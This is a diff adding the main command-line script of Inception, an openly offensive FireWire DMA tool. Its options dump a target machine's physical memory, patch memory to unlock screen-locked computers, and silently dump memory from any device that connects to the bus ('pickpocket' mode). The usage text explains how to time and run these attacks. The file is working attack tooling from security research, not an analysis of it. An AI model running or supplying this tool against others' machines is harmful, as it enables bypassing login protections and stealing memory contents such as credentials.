@@ -1,0 +1,292 @@
+#!/usr/local/bin/python3
+'''
+Inception - a FireWire physical memory manipulation and hacking tool exploiting
+IEEE 1394 SBP-2 DMA.
+
+Copyright (C) 2011-2013  Carsten Maartmann-Moe
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+Created on Oct 15, 2011
+
+@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
+'''
+
+from datetime import date
+from inception import firewire, screenlock, memdump, pickpocket, cfg, util, term, sound
+import getopt
+import os
+import sys
+import traceback
+import unittest
+import atexit
+
+
+def banner():
+    '''
+    Print obligatory awesome ASCII banner
+    '''
+    if (term.size() > 79):
+        print('''
+ _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
+ _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
+ _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
+ _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
+ _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|
+''')
+    else:
+        print('''
+INCEPTION
+        ''')
+    
+    term.write('v.{0} (C) Carsten Maartmann-Moe {1}'
+               .format(cfg.version, date.today().strftime("%Y")), 
+               indent = False)
+    term.write('Download: {0} | Twitter: @breaknenter'.format(cfg.url), 
+               indent = False)
+    print()
+
+
+def main(argv):
+    cfg.encoding = sys.getdefaultencoding()
+    
+    # Get and set terminal width
+    cfg.wrapper.width = term.size()
+    
+    banner()
+    
+    # Initialize
+    targets = cfg.targets
+    
+    # Detect host OS
+    cfg.os = util.detectos()
+
+    # Register cleanup function
+    atexit.register(util.cleanup)
+    
+    # Parse args
+    try:
+        opts, args = getopt.getopt(argv[1:], 'bd:Def:hlvw:npum:stP:ra', 
+                                   ['businfo', 'dump=', 'dump-all', 'egg', 
+                                    'file=', 'force-write', 'help', 'list', 
+                                    'verbose', 'wait=', 'no-write', 
+                                    'pickpocket', 'unload', 'manual=', 
+                                    'signatures', 'patch-file=', 'revert',
+                                    'test', 'avoid'])
+    except getopt.GetoptError as err:
+        term.warn(err)
+        usage(argv[0])
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt in ('-h', '--help'):
+            usage(argv[0])
+            sys.exit()
+        elif opt in ('-f', '--file'):
+            cfg.filemode = True
+            cfg.filename = str(arg)
+        elif opt in ('--force-write'):
+            cfg.forcewrite = True
+        elif opt in ('-l', '--list'):
+            term.info('Available targets:')
+            term.separator()
+            for n, target in enumerate(targets, 1):
+                term.info(target['OS'] + ': ' + target['name'], n)
+            term.separator()
+            sys.exit()
+        elif opt in ('-v', '--verbose'):
+            cfg.verbose = True
+        elif opt in ('-w', '--wait'):
+            cfg.fw_delay = int(arg)
+        elif opt in ('-n', '--no-write'):
+            cfg.dry_run = True
+        elif opt in ('-D', '--dump-all'):
+            cfg.memdump = True
+            start = 0x00
+            end = cfg.memsize
+        elif opt in ('-d', '--dump'):
+            cfg.memdump = True
+            try:
+                start, size = str(arg).split(',')
+                # Fix start
+                if '0x' in start:
+                    start = int(start, 0) & 0xfffff000 # Address
+                else:
+                    start = int(start) * cfg.PAGESIZE # Page number
+                # Fix size
+                try:
+                  size = util.parse_unit(size)
+                except ValueError:
+                  term.fail("Could not convert '{0}' to a data size")
+                if size < cfg.PAGESIZE:
+                    term.warn('Minimum dump size is a page, {0} KiB'
+                              .format(cfg.PAGESIZE // cfg.KiB))
+                end = start + size
+            except:
+                term.fail('Could not parse argument to {0}'.format(opt))
+        elif opt in ('-b', '--businfo'):
+            fw = firewire.FireWire()
+            fw.businfo()
+            sys.exit()
+        elif opt in ('-p', '--pickpocket'):
+            cfg.pickpocket = True
+        elif opt in ('-u', '--unload'):
+            if cfg.os == cfg.OSX:
+                util.unload_fw_ip()
+            else:
+                term.fail('Host system is not OS X, aborting')
+            sys.exit()
+        elif opt in ('-m', '--manual'):
+            try:
+                offset, signature, patch = str(arg).split(',')
+                offset = int(offset, 0)
+                signature = int(signature, 0)
+                patch = int(patch, 0)
+            except ValueError:
+                term.fail('You must provide a valid offset, signature and ' +
+                          'patch in manual mode')
+            targets = [{'OS': 'Non-specified OS',
+                        'versions': ['N/A'],
+                        'architectures': ['N/A'],
+                        'name': 'Manual patch',
+                        'notes': 'N/A',
+                        'signatures': [{'offsets': [offset],
+                                        'chunks': [{'chunk': signature,
+                                                    'internaloffset': 0x00,
+                                                    'patch': patch,
+                                                    'patchoffset': 0x00}]}]}]
+        elif opt in ('-s', '--signatures'):
+            cfg.list_signatures = True
+        elif opt in ('-e', '--egg'):
+            term.info('Turn up the volume, please!')
+            cfg.egg = True
+        elif opt in ('-P', '--patch-file'):
+            try:
+                cfg.patchfile = open(arg, 'rb').read()
+            except:
+                term.fail('Could not read patch file {0}'.format(arg))
+        elif opt in ('-r', '--revert'):
+            cfg.revert = True
+        elif opt in ('-t', '--test'):
+            suite = unittest.TestLoader().discover('./inception/test')
+            unittest.TextTestRunner().run(suite)
+            sys.exit()
+        else:
+            assert False, 'Option not handled: ' + opt
+    
+    # We don't accept any other arguments
+    if args:
+        term.warn('Arguments {0} ignored'.format(', '.join(args)))
+    
+    if cfg.list_signatures:
+        screenlock.list_targets(targets, details=True)
+        sys.exit()
+
+    # Warn OS X users
+    if cfg.os == cfg.OSX and not cfg.filemode:
+        term.warn('Attacking from OS X may cause host system crashes')
+    
+    # Here we go
+    try:
+        if cfg.egg:
+                cfg.eggs.append(sound.play('resources/rien.mp3'))
+        if cfg.memdump:
+            if cfg.filemode and end == cfg.memsize: 
+                # Make sure we don't read past the end of the input file
+                end = os.stat(cfg.filename).st_size
+            memdump.dump(start, end)
+        elif cfg.pickpocket:
+            if cfg.filemode:
+                term.fail("Pickpocket mode is not compatible with file mode")
+            pickpocket.lurk()
+        else:
+            address, page = screenlock.attack(targets)
+            if not address or not page:
+                term.fail('Could not locate signature(s).')
+    # TODO: Add QuitException here so that the music stops (or a util.quit() method)
+    except Exception as exc:
+        term.warn('Um, something went wrong: {0}'.format(exc))
+        term.separator()
+        traceback.print_exc()
+        term.separator()
+    except KeyboardInterrupt:
+        term.warn('Aborted')
+
+    sys.exit()
+
+
+def usage(execname):
+    print(
+'''Inception is a FireWire physical memory manipulation and hacking tool 
+exploiting IEEE 1394 SBP-2 DMA.
+
+Usage: ''' + os.path.basename(execname) + ''' [OPTIONS]
+
+Options:
+    -b, --businfo         Prints information about the devices that is connected
+                          to the FireWire bus.
+    -d, --dump=ADDRESS,PAGES
+                          Non-intrusive memory dump. Dumps PAGES of memory
+                          content from ADDRESS page. Memory content is dumped to
+                          a file in the working dir. ADDR can be a page number 
+                          or a hexadecimal address within a page. PAGES can be a
+                          number of pages or a size of data using the
+                          denomination KiB, MiB or GiB. Example: -d 0x00ff,5MiB
+                          This command dumps the first 5 MiB of memory after 
+                          0x00ff. Note that due to unreliable behavior on some 
+                          targets when accessing data below 1 MiB, this command 
+                          will avoid that region of upper memory when dumping,
+                          and replace the first MB with zeroes.
+    -D                    Same as -d, but dumps all available memory. Same notes
+                          as above apply. The first MB of memory will be
+                          replaced by zeroes.
+    -f, --file=FILE       Use a file instead of FireWire bus data as input; for
+                          example to facilitate attacks on VMware machine memory
+                          files (.vmem) and to ease testing and signature 
+                          creation efforts.
+    --force-write         Forces patching when using files as input (see -f). By
+                          default, Inception does not write back to data files.
+    -h, --help:           Displays this message.
+    -l, --list:           Lists configured operating system targets.
+    -m, --manual=OFFSET,SIGNATURE,PATCH
+                          Specify a patch manually. Enables easy testing of new
+                          signatures; to use provide a comma-separated list of
+                          an offset, a signature and a patch as integers or
+                          in a hexadecimal format (prepended by '0x').
+    -n, --no-write        Dry run, do not write back to memory.
+    -p, --pickpocket      Dump the physical memory of any device that connects
+                          to the FireWire bus. This may be useful when
+                          exploiting a Daisy chain.
+    -P, --patch-file=FILENAME
+                          Specify custom patch from file (screen unlock mode)
+    -r, --revert          Revert patch after use (screen unlock mode)
+    -s, --signatures      Parses and prints the signatures from cfg.py. May
+                          be used together with -m/--manual.
+    -t, --test            Run all unit tests; test that Inception works as 
+                          intended.
+    -u, --unload          OS X only: Unloads IOFireWireIP.kext (OS X IP over
+                          FireWire module) which are known to cause kernel
+                          panics when the host (attacking system) is OS X. Must
+                          be executed BEFORE any FireWire devices are connected
+                          to the host.
+    -v, --verbose         Verbose mode - among other things, this prints read 
+                          data to stdout, useful for debugging.
+    -w, --wait=TIME       Delay attack by TIME seconds. This is useful in order
+                          to guarantee that the target machine has successfully
+                          granted the host DMA before attacking. If the
+                          attack fails, try to increase this value. Default
+                          delay is 5 seconds.''')
+
+
+if __name__ == '__main__':
+    main(sys.argv)
